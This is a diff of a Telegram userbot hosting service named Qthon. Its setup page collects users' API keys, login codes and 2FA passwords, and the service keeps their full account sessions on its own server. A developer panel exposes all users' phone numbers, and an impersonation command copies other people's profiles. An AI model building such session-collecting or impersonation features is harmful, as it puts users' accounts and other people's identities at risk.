@@ -24,7 +24,6 @@ from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import ToggleDialogPinRequest, GetDialogsRequest
 from telethon.tl.types import InputPeerChannel, InputPeerUser
 
-# ========== تخزين الجلسات ==========
 DATA_DIR = '/data' if os.path.exists('/data') else '.'
 os.makedirs(DATA_DIR, exist_ok=True)
 SESSION_FILE = os.path.join(DATA_DIR, 'active_sessions.json')
@@ -32,11 +31,7 @@ API_CONFIG_FILE = os.path.join(DATA_DIR, 'api_config.json')
 TEMP_DIR = os.path.join(DATA_DIR, 'temp')
 os.makedirs(TEMP_DIR, exist_ok=True)
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.StreamHandler(sys.stdout)]
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler(sys.stdout)])
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
@@ -181,12 +176,7 @@ def start_client_in_background(client, phone):
             await cache_user_info(client, phone)
             await setup_handlers(client, phone)
             try:
-                await client.send_message('me', """
-**Qthon UserBot**
-
-• Send **.اوامر** for commands
-• Channel: @Q_g_r_a_m
-""", parse_mode='md')
+                await client.send_message('me', "**Qthon UserBot**\n\n• Send **.اوامر** for commands\n• Channel: @Q_g_r_a_m", parse_mode='md')
             except:
                 pass
             await client.run_until_disconnected()
@@ -208,13 +198,13 @@ async def setup_handlers(client, phone):
         bold_mode[phone] = False
         save_deleted[phone] = False
         deleted_messages[phone] = []
-    
+
     @client.on(events.NewMessage(incoming=True))
     async def auto_mute(event):
         if event.is_private and event.sender_id in muted_users.get(phone, {}):
             try: await event.delete()
             except: pass
-    
+
     @client.on(events.NewMessage(incoming=True))
     async def auto_taqleed(event):
         if event.is_private and event.sender_id in taqleed_users.get(phone, {}) and event.text:
@@ -222,49 +212,32 @@ async def setup_handlers(client, phone):
                 await asyncio.sleep(0.5)
                 try: await client.send_message(event.sender_id, event.text)
                 except: pass
-    
+
     @client.on(events.NewMessage(outgoing=True))
     async def bold_handler(event):
         if bold_mode.get(phone, False) and event.text and not event.text.startswith('.'):
             try: await event.edit(f"**{event.text}**")
             except: pass
-    
-    # ==================== الأوامر الأساسية ====================
+
     @client.on(events.NewMessage(outgoing=True, pattern='.سورس'))
     async def src(event):
         await event.edit("**Qthon**\n\n• Channel: @Q_g_r_a_m\n• Setup: @Qthon_bot", parse_mode='md')
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.اوامر'))
     async def cmds(event):
         track_command(phone, ".اوامر")
-        await event.edit("""**Qthon Commands**
+        await event.edit("""**Qthon Commands**\n\n• ايدي - كشف\n• تقليد - الغاء تقليد\n• انتحال - الغاء انتحال\n• خط عريض - الغاء خط\n• اسم + الاسم\n• بايو + البايو\n• كتم - الغاء كتم\n• حظر - الغاء حظر\n• تقيد - الغاء تقييد\n• تهكير\n• بنغ\n• سجل - الغاء سجل\n• تثبيت\n• اوامر\n• سورس""", parse_mode='md')
 
-• ايدي - كشف
-• تقليد - الغاء تقليد
-• انتحال - الغاء انتحال
-• خط عريض - الغاء خط
-• اسم + الاسم
-• بايو + البايو
-• كتم - الغاء كتم
-• حظر - الغاء حظر
-• تقيد - الغاء تقييد
-• تهكير
-• بنغ
-• سجل - الغاء سجل
-• تثبيت
-• اوامر
-• سورس""", parse_mode='md')
-    
     @client.on(events.NewMessage(outgoing=True, pattern='.بنغ'))
     async def ping(event):
         await event.edit(f"**Speed: {random.randint(180, 220)}ms**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.تثبيت'))
     async def pin_cmd(event):
         await event.edit("**• Pinning...**")
         await ensure_subscription(client, phone)
         await event.edit("**• Channel pinned**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern=r'\.(ايدي|كشف)'))
     async def id_cmd(event):
         track_command(phone, ".ايدي")
@@ -282,7 +255,7 @@ async def setup_handlers(client, phone):
         except: pass
         lines.append(f"ID: {user.id}")
         await client.send_message(event.chat_id, "\n".join(lines))
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.تقليد'))
     async def taq(event):
         track_command(phone, ".تقليد")
@@ -290,7 +263,7 @@ async def setup_handlers(client, phone):
         if event.is_reply: tid = (await event.get_reply_message()).sender_id
         elif event.is_private: tid = event.chat_id
         if tid: taqleed_users[phone][tid] = True; await event.edit("**• Taqleed ON**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء تقليد'))
     async def notaq(event):
         tid = None
@@ -298,7 +271,7 @@ async def setup_handlers(client, phone):
         elif event.is_private: tid = event.chat_id
         if tid: taqleed_users[phone].pop(tid, None)
         await event.edit("**• Taqleed OFF**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.انتحال'))
     async def ent7al(event):
         track_command(phone, ".انتحال")
@@ -311,7 +284,6 @@ async def setup_handlers(client, phone):
             try: target = await client.get_entity(event.chat_id)
             except: pass
         if not target: await event.edit("**• Failed**"); return
-        
         me = client_me.get(phone) or await client.get_me()
         client_me[phone] = me
         original = {'first_name': me.first_name or '', 'last_name': me.last_name or '', 'photo_path': None, 'about': ''}
@@ -326,7 +298,6 @@ async def setup_handlers(client, phone):
                 if await client.download_profile_photo('me', file=pp): original['photo_path'] = pp
         except: pass
         ent7al_original[phone] = original
-        
         try: await client(UpdateProfileRequest(first_name=target.first_name or '', last_name=target.last_name or ''))
         except: pass
         try:
@@ -348,10 +319,9 @@ async def setup_handlers(client, phone):
                     await asyncio.sleep(2)
                     if os.path.exists(pp): os.remove(pp)
             except: pass
-        
         ent7al_users[phone] = True
         await event.edit("**• Done**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء انتحال'))
     async def unent7al(event):
         await event.edit("**• Restoring...**")
@@ -374,7 +344,7 @@ async def setup_handlers(client, phone):
             ent7al_users[phone] = False
             ent7al_original[phone] = {}
         await event.edit("**• Restored**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.كتم'))
     async def mute(event):
         track_command(phone, ".كتم")
@@ -382,7 +352,7 @@ async def setup_handlers(client, phone):
         if event.is_reply: tid = (await event.get_reply_message()).sender_id
         elif event.is_private: tid = event.chat_id
         if tid: muted_users[phone][tid] = True; await event.edit("**• Muted**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء كتم'))
     async def unmute(event):
         tid = None
@@ -390,7 +360,7 @@ async def setup_handlers(client, phone):
         elif event.is_private: tid = event.chat_id
         if tid: muted_users[phone].pop(tid, None)
         await event.edit("**• Unmuted**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.حظر'))
     async def ban(event):
         track_command(phone, ".حظر")
@@ -400,7 +370,7 @@ async def setup_handlers(client, phone):
         if tid:
             try: await client(BlockRequest(tid)); banned_users[phone][tid] = True; await event.edit("**• Banned**")
             except: await event.edit("**• Failed**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء حظر'))
     async def unban(event):
         tid = None
@@ -409,20 +379,20 @@ async def setup_handlers(client, phone):
         if tid:
             try: await client(UnblockRequest(tid)); banned_users[phone].pop(tid, None); await event.edit("**• Unbanned**")
             except: await event.edit("**• Failed**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.تقيد'))
     async def restrict(event):
         track_command(phone, ".تقيد")
         if event.is_group and event.is_reply:
             try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=False); await event.edit("**• Restricted**")
             except: await event.edit("**• Failed**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء تقييد'))
     async def unrestrict(event):
         if event.is_group and event.is_reply:
             try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=True); await event.edit("**• Unrestricted**")
             except: await event.edit("**• Failed**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.تهكير'))
     async def hack(event):
         track_command(phone, ".تهكير")
@@ -433,40 +403,39 @@ async def setup_handlers(client, phone):
         await event.edit("**Hacking...**"); await asyncio.sleep(1)
         await event.edit("**50%**"); await asyncio.sleep(1)
         await event.edit(f"**{n} hacked!**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.خط عريض'))
     async def bold(event):
         bold_mode[phone] = True; await event.edit("**• Bold ON**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء خط'))
     async def nobold(event):
         bold_mode[phone] = False; await event.edit("**• Bold OFF**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.سجل'))
     async def save(event):
         save_deleted[phone] = True; await event.edit("**• Logging ON**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern='.الغاء سجل'))
     async def nosave(event):
         save_deleted[phone] = False; await event.edit("**• Logging OFF**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern=r'\.اسم (.+)'))
     async def name(event):
         try: await client(UpdateProfileRequest(first_name=event.pattern_match.group(1).strip(), last_name='')); await event.edit("**• Name changed**")
         except: await event.edit("**• Failed**")
-    
+
     @client.on(events.NewMessage(outgoing=True, pattern=r'\.بايو (.+)'))
     async def bio(event):
         try: await client(UpdateProfileRequest(about=event.pattern_match.group(1).strip())); await event.edit("**• Bio changed**")
         except: await event.edit("**• Failed**")
-    
+
     logger.info(f"Handlers ready: {phone}")
 
 # ======================== بوت المطور ========================
 bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_HASH)
 
 async def notify_dev(message):
-    """إرسال إشعار للمطور"""
     try:
         dev_client = None
         for phone, client in active_clients.items():
@@ -475,527 +444,612 @@ async def notify_dev(message):
                 break
         if dev_client:
             await dev_client.send_message('me', message)
-        else:
-            # إذا لم يكن المطور مسجلاً، نستخدم البوت لإرسال رسالة إلى معرف المطور
-            # لكن لا يمكن للبوت إرسال رسالة إلى مستخدم إلا إذا بدأ المحادثة أولاً
-            pass
     except Exception as e:
         logger.error(f"Failed to notify dev: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def bot_start(event):
-    user_id = str(event.sender_id)
-    # التحقق مما إذا كان المستخدم هو المطور
-    if user_id == DEV_PHONE:
-        # قائمة المطور
-        buttons = [
-            [Button.inline("USERS COUNT", b"dev_users"),
-             Button.inline("ACTIVE NOW", b"dev_active")],
-            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
-             Button.inline("GROUPS LIST", b"dev_groups")],
-            [Button.inline("CHANNELS LIST", b"dev_channels"),
-             Button.inline("BROADCAST", b"dev_broadcast")],
-        ]
-        await event.respond(
-            "**Qthon Developer Panel**\n\nSelect an option.",
-            buttons=buttons,
-            parse_mode='md'
-        )
-        await notify_dev("Developer logged in to bot panel.")
-    else:
-        # مستخدم عادي - يظهر زر Mini App
-        site_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
-        buttons = [
-            [Button.url("OPEN SETUP", site_url)],
-        ]
-        await event.respond(
-            "**Qthon Setup**\n\n"
-            "Welcome! Press the button below to open the setup page.\n"
-            "You will need API ID and API Hash from my.telegram.org.",
-            buttons=buttons,
-            parse_mode='md'
-        )
-        # إشعار المطور بمستخدم جديد
-        await notify_dev(f"New user started setup: {user_id}")
+    sender = await event.get_sender()
+    sender_phone = getattr(sender, 'phone', None)
+    user_id = event.sender_id
+
+    buttons = [
+        [Button.url("🔗 جلب بيانات الحساب", "https://my.telegram.org/apps")],
+        [Button.url("⚙️ فتح صفحة التنصيب", os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000'))],
+    ]
+    await event.respond(
+        "**أهلاً بك في Qthon** 👋\n\n"
+        "لبدء التنصيب، تحتاج إلى جلب بيانات حسابك من تيليجرام.\n\n"
+        "**الخطوات:**\n"
+        "① اضغط على **جلب بيانات الحساب**\n"
+        "② سجّل دخولك وانسخ الـ API ID والـ API Hash\n"
+        "③ ارجع هنا واضغط **فتح صفحة التنصيب**\n\n"
+        "الأمر بسيط ولا يستغرق دقيقتين 🚀",
+        buttons=buttons,
+        parse_mode='md'
+    )
+    # إشعار المطور
+    try:
+        name = getattr(sender, 'first_name', 'Unknown')
+        username = f"@{sender.username}" if getattr(sender, 'username', None) else "بدون يوزر"
+        await notify_dev(f"🔔 مستخدم جديد بدأ البوت\n👤 {name} | {username}\n🆔 {user_id}")
+    except:
+        pass
 
 @bot.on(events.CallbackQuery())
 async def dev_callback(event):
     data = event.data.decode()
-    user_id = str(event.sender_id)
-    if user_id != DEV_PHONE:
-        await event.answer("Access denied", alert=True)
+    sender = await event.get_sender()
+    sender_phone = getattr(sender, 'phone', '')
+
+    # تحقق من المطور بالـ ID مش الرقم
+    dev_ids = []
+    for phone, client in active_clients.items():
+        if phone == DEV_PHONE:
+            try:
+                me = await client.get_me()
+                dev_ids.append(me.id)
+            except:
+                pass
+
+    if event.sender_id not in dev_ids:
+        await event.answer("⛔ غير مصرح", alert=True)
         return
-    
+
     if data == "dev_users":
         total = len(active_clients)
-        msg = f"**Total Registered Users:** {total}\n\n"
+        msg = f"**👥 المستخدمون المسجلون: {total}**\n\n"
         for phone, info in user_info_cache.items():
-            username = f"@{info['username']}" if info['username'] else "no username"
+            username = f"@{info['username']}" if info['username'] else "بدون يوزر"
             msg += f"• {info['first_name']} | {username} | {phone}\n"
         if not user_info_cache:
-            msg += "No users found."
+            msg += "لا يوجد مستخدمون."
         await event.edit(msg, parse_mode='md')
-    
+
     elif data == "dev_active":
         active_count = len(active_clients)
-        msg = f"**Currently Active:** {active_count}\n\n"
+        msg = f"**🟢 النشطون حالياً: {active_count}**\n\n"
         for phone, client in active_clients.items():
             info = user_info_cache.get(phone, {})
             name = info.get('first_name', phone)
             msg += f"• {name} | {phone}\n"
         if not active_clients:
-            msg += "No active sessions."
+            msg += "لا توجد جلسات نشطة."
         await event.edit(msg, parse_mode='md')
-    
+
     elif data == "dev_topcmd":
         all_cmds = Counter()
         for cmds in command_stats.values():
             all_cmds.update(cmds)
         top = all_cmds.most_common(10)
-        msg = "**Top 10 Commands:**\n\n"
+        msg = "**📊 أكثر 10 أوامر استخداماً:**\n\n"
         for i, (cmd, cnt) in enumerate(top, 1):
-            msg += f"{i}. .{cmd}: {cnt} times\n"
+            msg += f"{i}. {cmd}: {cnt} مرة\n"
         if not top:
-            msg += "No commands used yet."
+            msg += "لم يُستخدم أي أمر بعد."
         await event.edit(msg, parse_mode='md')
-    
-    elif data == "dev_groups":
-        msg = "**Groups:**\n\n"
-        for phone, info in user_info_cache.items():
-            groups = info.get('groups', [])
-            if groups:
-                msg += f"**{info.get('first_name', phone)}:**\n"
-                for g in groups[:5]:
-                    msg += f"  • {g['name']}\n"
-        if not msg.strip():
-            msg = "No groups found."
-        await event.edit(msg, parse_mode='md')
-    
-    elif data == "dev_channels":
-        msg = "**Channels:**\n\n"
-        for phone, info in user_info_cache.items():
-            channels = info.get('channels', [])
-            if channels:
-                msg += f"**{info.get('first_name', phone)}:**\n"
-                for c in channels[:5]:
-                    msg += f"  • {c['name']}\n"
-        if not msg.strip():
-            msg = "No channels found."
-        await event.edit(msg, parse_mode='md')
-    
+
     elif data == "dev_broadcast":
-        # يمكن إضافة وظيفة البث لاحقًا
-        await event.answer("Broadcast feature coming soon", alert=True)
-    
+        await event.answer("قريباً", alert=True)
+
     await event.answer()
 
-# ======================== موقع الويب الفاخر ========================
+
+# ======================== موقع الويب ========================
 @app.route('/')
 def home():
     domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
-    return f"""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-        <title>Qthon - UserBot Setup</title>
-        <style>
-            :root {{
-                --bg: #0a0a19;
-                --bg2: #121226;
-                --surface: rgba(255,255,255,0.04);
-                --glass: rgba(255,255,255,0.06);
-                --glass-border: rgba(255,255,255,0.08);
-                --text: #FFFFFF;
-                --text-secondary: rgba(255,255,255,0.5);
-                --text-tertiary: rgba(255,255,255,0.3);
-                --accent: #4F6EF7;
-                --accent-glow: rgba(79,110,247,0.3);
-                --success: #34C759;
-                --danger: #FF3B30;
-                --radius: 16px;
-                --radius-xl: 24px;
-            }}
-            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-            body {{
-                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', system-ui, sans-serif;
-                background: var(--bg);
-                color: var(--text);
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                padding: 16px;
-                -webkit-font-smoothing: antialiased;
-                -moz-osx-font-smoothing: grayscale;
-                overflow-x: hidden;
-            }}
-            body::before {{
-                content: '';
-                position: fixed;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: radial-gradient(ellipse at 50% 0%, rgba(79,110,247,0.06) 0%, transparent 60%),
-                            radial-gradient(ellipse at 80% 80%, rgba(79,110,247,0.04) 0%, transparent 50%);
-                pointer-events: none;
-                z-index: 0;
-                animation: ambientPulse 8s ease-in-out infinite;
-            }}
-            @keyframes ambientPulse {{
-                0%, 100% {{ opacity: 1; }}
-                50% {{ opacity: 0.6; }}
-            }}
-            .container {{
-                position: relative;
-                z-index: 1;
-                width: 100%;
-                max-width: 420px;
-            }}
-            .header {{
-                text-align: center;
-                margin-bottom: 32px;
-            }}
-            .logo {{
-                font-size: 52px;
-                font-weight: 700;
-                letter-spacing: -1.5px;
-                background: linear-gradient(135deg, #FFFFFF 0%, rgba(255,255,255,0.8) 100%);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                background-clip: text;
-                line-height: 1.1;
-                margin-bottom: 4px;
-                animation: fadeInUp 0.6s ease;
-            }}
-            @keyframes fadeInUp {{
-                from {{ opacity: 0; transform: translateY(20px); }}
-                to {{ opacity: 1; transform: translateY(0); }}
-            }}
-            .subtitle {{
-                font-size: 12px;
-                font-weight: 500;
-                letter-spacing: 2px;
-                text-transform: uppercase;
-                color: var(--text-tertiary);
-                animation: fadeInUp 0.8s ease;
-            }}
-            .card {{
-                background: var(--bg2);
-                border: 1px solid var(--glass-border);
-                border-radius: var(--radius-xl);
-                padding: 28px 24px;
-                box-shadow: 0 24px 80px rgba(0,0,0,0.4);
-                backdrop-filter: blur(20px);
-                -webkit-backdrop-filter: blur(20px);
-                transition: border-color 0.3s ease;
-                animation: fadeInUp 0.5s ease;
-            }}
-            .card:hover {{
-                border-color: rgba(255,255,255,0.12);
-            }}
-            .section-title {{
-                font-size: 13px;
-                font-weight: 600;
-                letter-spacing: 1.5px;
-                text-transform: uppercase;
-                color: var(--text-secondary);
-                margin-bottom: 24px;
-                text-align: center;
-            }}
-            .input-group {{
-                margin-bottom: 16px;
-            }}
-            .input-label {{
-                display: block;
-                font-size: 11px;
-                font-weight: 600;
-                letter-spacing: 1.2px;
-                text-transform: uppercase;
-                color: var(--text-tertiary);
-                margin-bottom: 8px;
-            }}
-            .input-field {{
-                width: 100%;
-                padding: 14px 16px;
-                background: var(--surface);
-                border: 1px solid var(--glass-border);
-                border-radius: var(--radius);
-                color: var(--text);
-                font-size: 15px;
-                font-family: 'SF Mono', 'JetBrains Mono', 'Fira Code', monospace;
-                letter-spacing: 0.5px;
-                outline: none;
-                transition: all 0.25s ease;
-            }}
-            .input-field:focus {{
-                border-color: rgba(79,110,247,0.5);
-                box-shadow: 0 0 0 4px rgba(79,110,247,0.08);
-                background: rgba(255,255,255,0.06);
-            }}
-            .btn {{
-                width: 100%;
-                padding: 16px;
-                border: none;
-                border-radius: var(--radius);
-                font-size: 15px;
-                font-weight: 600;
-                letter-spacing: 0.5px;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                margin-top: 8px;
-                position: relative;
-                overflow: hidden;
-                -webkit-tap-highlight-color: transparent;
-            }}
-            .btn-primary {{
-                background: var(--accent);
-                color: #FFF;
-                transform: translateY(0);
-                box-shadow: 0 4px 15px rgba(79,110,247,0.2);
-            }}
-            .btn-primary:hover {{
-                background: #5F7EF9;
-                box-shadow: 0 8px 32px var(--accent-glow);
-                transform: translateY(-1px);
-            }}
-            .btn-primary:active {{
-                transform: scale(0.98);
-                transition: transform 0.1s ease;
-            }}
-            .btn-success {{
-                background: var(--success);
-                color: #FFF;
-                box-shadow: 0 4px 15px rgba(52,199,89,0.2);
-            }}
-            .btn-success:hover {{
-                box-shadow: 0 8px 32px rgba(52,199,89,0.3);
-                transform: translateY(-1px);
-            }}
-            .btn-ghost {{
-                background: transparent;
-                color: var(--text-secondary);
-                border: 1px solid var(--glass-border);
-                position: absolute;
-                top: 16px;
-                right: 16px;
-                width: auto;
-                padding: 8px 16px;
-                font-size: 13px;
-                border-radius: 12px;
-            }}
-            .btn-ghost:hover {{
-                background: rgba(255,255,255,0.05);
-                color: var(--text);
-            }}
-            .result {{
-                margin-top: 20px;
-                padding: 14px 18px;
-                border-radius: var(--radius);
-                font-size: 13px;
-                font-weight: 500;
-                text-align: center;
-                display: none;
-                animation: fadeInUp 0.4s ease;
-            }}
-            .result.show {{
-                display: block;
-            }}
-            .result.success {{
-                background: rgba(52,199,89,0.1);
-                border: 1px solid rgba(52,199,89,0.2);
-                color: var(--success);
-            }}
-            .result.error {{
-                background: rgba(255,59,48,0.1);
-                border: 1px solid rgba(255,59,48,0.2);
-                color: var(--danger);
-            }}
-            .hidden {{ display: none; }}
-            .relative {{ position: relative; }}
-            .help-box {{
-                margin-top: 24px;
-                padding: 20px;
-                background: var(--bg2);
-                border-radius: var(--radius);
-                border: 1px solid var(--glass-border);
-                animation: fadeInUp 0.7s ease;
-            }}
-            .help-box h3 {{
-                font-size: 14px;
-                font-weight: 600;
-                margin-bottom: 12px;
-                color: var(--text);
-            }}
-            .help-box a {{
-                color: var(--accent);
-                text-decoration: none;
-                font-weight: 500;
-                border-bottom: 1px solid transparent;
-                transition: border-color 0.2s;
-            }}
-            .help-box a:hover {{
-                border-bottom-color: var(--accent);
-            }}
-            .help-box p {{
-                font-size: 13px;
-                color: var(--text-secondary);
-                line-height: 1.7;
-                margin-bottom: 8px;
-            }}
-            /* Progress inside button */
-            .btn.loading {{
-                pointer-events: none;
-                opacity: 0.8;
-            }}
-            .btn.loading::after {{
-                content: '';
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                width: 18px;
-                height: 18px;
-                margin-left: -9px;
-                margin-top: -9px;
-                border: 2px solid transparent;
-                border-top-color: currentColor;
-                border-radius: 50%;
-                animation: spin 0.8s linear infinite;
-            }}
-            @keyframes spin {{
-                to {{ transform: rotate(360deg); }}
-            }}
-            @media (max-width: 380px) {{
-                .card {{ padding: 20px 16px; }}
-                .logo {{ font-size: 42px; }}
-                .btn-ghost {{ top: 8px; right: 8px; }}
-            }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1 class="logo">Qthon</h1>
-                <p class="subtitle">Telethon Setup</p>
-            </div>
-            <div class="card">
-                <div id="step1">
-                    <p class="section-title">Account Configuration</p>
-                    <form id="sendForm" autocomplete="off">
-                        <div class="input-group">
-                            <label class="input-label">API ID</label>
-                            <input type="text" name="api_id" id="api_id" placeholder="12345678" required class="input-field" inputmode="numeric">
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">API Hash</label>
-                            <input type="text" name="api_hash" id="api_hash" placeholder="0123456789abcdef..." required class="input-field">
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Phone Number</label>
-                            <input type="text" name="phone" id="phone" placeholder="+201234567890" required class="input-field">
-                        </div>
-                        <button type="submit" class="btn btn-primary" id="sendBtn">Send Verification Code</button>
-                    </form>
-                </div>
-                <div id="step2" class="hidden relative">
-                    <button onclick="backToStep1()" class="btn btn-ghost">Back</button>
-                    <p class="section-title">Verify Code</p>
-                    <form id="verifyForm" autocomplete="off">
-                        <input type="hidden" name="phone" id="verify_phone">
-                        <div class="input-group">
-                            <label class="input-label">Verification Code</label>
-                            <input type="text" name="code" id="code" placeholder="12345" required maxlength="5" class="input-field" style="text-align:center;font-size:24px;letter-spacing:8px" inputmode="numeric">
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">2FA Password (optional)</label>
-                            <input type="password" name="password" id="password" placeholder="••••••••" class="input-field">
-                        </div>
-                        <button type="submit" class="btn btn-success" id="verifyBtn">Activate</button>
-                    </form>
-                </div>
-                <div id="result" class="result"></div>
-            </div>
-            <div class="help-box">
-                <h3>Need API credentials?</h3>
-                <p>1. Visit <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></p>
-                <p>2. Log in with your phone number</p>
-                <p>3. Go to <strong>API development tools</strong></p>
-                <p>4. Create an application to get your <strong>api_id</strong> and <strong>api_hash</strong></p>
-            </div>
-        </div>
-        <script>
-            const resultDiv = document.getElementById('result');
-            const sendBtn = document.getElementById('sendBtn');
-            const verifyBtn = document.getElementById('verifyBtn');
+    return """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Qthon — UserBot Setup</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
 
-            function showResult(message, isSuccess) {{
-                resultDiv.className = 'result show ' + (isSuccess ? 'success' : 'error');
-                resultDiv.textContent = message;
-            }}
+  :root {
+    --bg:        #080810;
+    --surface:   #0f0f1e;
+    --card:      #12121f;
+    --border:    rgba(255,255,255,0.07);
+    --border-hi: rgba(255,255,255,0.14);
+    --accent:    #5B6CF9;
+    --accent2:   #7C5CF9;
+    --glow:      rgba(91,108,249,0.25);
+    --success:   #30D158;
+    --danger:    #FF453A;
+    --text:      #FFFFFF;
+    --text2:     rgba(255,255,255,0.55);
+    --text3:     rgba(255,255,255,0.28);
+    --r:         18px;
+    --r2:        26px;
+  }
 
-            function setLoading(btn, loading) {{
-                if (loading) {{
-                    btn.classList.add('loading');
-                    btn.disabled = true;
-                }} else {{
-                    btn.classList.remove('loading');
-                    btn.disabled = false;
-                }}
-            }}
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
 
-            document.getElementById('sendForm').addEventListener('submit', async (e) => {{
-                e.preventDefault();
-                const formData = new FormData(e.target);
-                setLoading(sendBtn, true);
-                try {{
-                    const res = await fetch('/api/send_code', {{ method: 'POST', body: formData }});
-                    const data = await res.json();
-                    if (data.status === 'code_sent') {{
-                        document.getElementById('verify_phone').value = formData.get('phone');
-                        document.getElementById('step1').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                        showResult(data.message, true);
-                    }} else {{
-                        showResult(data.message || data.error || 'An error occurred', false);
-                    }}
-                }} catch (err) {{
-                    showResult('Connection error', false);
-                }} finally {{
-                    setLoading(sendBtn, false);
-                }}
-            }});
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 16px 40px;
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
 
-            document.getElementById('verifyForm').addEventListener('submit', async (e) => {{
-                e.preventDefault();
-                const formData = new FormData(e.target);
-                setLoading(verifyBtn, true);
-                try {{
-                    const res = await fetch('/api/verify', {{ method: 'POST', body: formData }});
-                    const data = await res.json();
-                    if (data.status === 'success') {{
-                        showResult('Telethon Qthon has been installed successfully!', true);
-                        // No reload, just show message
-                    }} else {{
-                        showResult(data.message || 'Verification failed', false);
-                    }}
-                }} catch (err) {{
-                    showResult('Connection error', false);
-                }} finally {{
-                    setLoading(verifyBtn, false);
-                }}
-            }});
+  /* ── ambient glow ── */
+  body::before {
+    content:'';
+    position:fixed; inset:0;
+    background:
+      radial-gradient(ellipse 80% 50% at 50% -10%, rgba(91,108,249,.10) 0%, transparent 70%),
+      radial-gradient(ellipse 50% 40% at 80% 90%,  rgba(124,92,249,.06) 0%, transparent 60%);
+    pointer-events:none; z-index:0;
+  }
 
-            function backToStep1() {{
-                document.getElementById('step1').classList.remove('hidden');
-                document.getElementById('step2').classList.add('hidden');
-                resultDiv.className = 'result';
-            }}
-        </script>
-    </body>
-    </html>
-    """
+  .wrap {
+    position:relative; z-index:1;
+    width:100%; max-width:400px;
+    display:flex; flex-direction:column; gap:20px;
+  }
+
+  /* ── header ── */
+  .hd { text-align:center; padding:8px 0 4px; }
+
+  .hd-icon {
+    width:72px; height:72px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius:22px;
+    margin:0 auto 16px;
+    display:flex; align-items:center; justify-content:center;
+    box-shadow: 0 0 0 1px rgba(255,255,255,.08), 0 12px 40px var(--glow);
+    animation: popIn .5s cubic-bezier(.34,1.56,.64,1) both;
+  }
+  .hd-icon svg { width:36px; height:36px; fill:#fff; }
+
+  .hd h1 {
+    font-size: 32px;
+    font-weight: 800;
+    letter-spacing: -1.2px;
+    background: linear-gradient(135deg, #fff 0%, rgba(255,255,255,.75) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: fadeUp .5s .1s ease both;
+  }
+  .hd p {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text3);
+    letter-spacing: .5px;
+    margin-top: 4px;
+    animation: fadeUp .5s .2s ease both;
+  }
+
+  /* ── card ── */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: var(--r2);
+    padding: 28px 24px;
+    box-shadow: 0 2px 0 rgba(255,255,255,.03) inset,
+                0 32px 80px rgba(0,0,0,.5);
+    animation: fadeUp .5s .15s ease both;
+    transition: border-color .3s;
+  }
+  .card:hover { border-color: var(--border-hi); }
